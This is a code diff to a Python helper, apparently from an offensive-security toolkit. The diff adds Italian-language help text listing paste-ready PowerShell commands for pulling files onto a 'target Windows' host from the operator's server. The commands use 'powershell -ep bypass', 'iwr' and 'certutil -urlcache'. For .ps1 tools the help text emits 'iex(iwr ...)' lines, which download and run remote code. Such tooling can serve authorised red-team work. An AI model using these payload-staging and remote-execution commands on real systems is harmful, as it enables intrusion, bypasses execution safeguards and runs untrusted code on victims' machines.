@@ -260,7 +260,24 @@ def _serve_help_static() -> None:
             lines.append(f"curl {base}/{name} -o {name}")
         else:
             lines.append(f"curl {base}/{name} -o {name} && chmod +x {name}")
-    lines.append("```")
+    lines.append("```\n")
+    lines.append("## Download da target Windows\n")
+    lines.append("Per qualsiasi file in `static/` (schema generale):\n")
+    lines.append("```powershell")
+    lines.append(f'powershell -ep bypass -c "iwr {base}/FILE -OutFile FILE"')
+    lines.append(f"certutil -urlcache -split -f {base}/FILE FILE")
+    lines.append("```\n")
+    win_tools = [e["name"] for e in TOOL_CATALOG
+                 if e["name"].endswith((".exe", ".ps1", ".bat", ".dll"))]
+    if win_tools:
+        lines.append("Tool Windows del catalogo, pronti da incollare:\n")
+        lines.append("```powershell")
+        for name in win_tools:
+            if name.endswith(".ps1"):
+                lines.append(f'powershell -ep bypass -c "iex(iwr {base}/{name} -UseBasicParsing)"')
+            else:
+                lines.append(f'powershell -ep bypass -c "iwr {base}/{name} -OutFile {name}"')
+        lines.append("```")
     render_markdown("\n".join(lines))
 
 
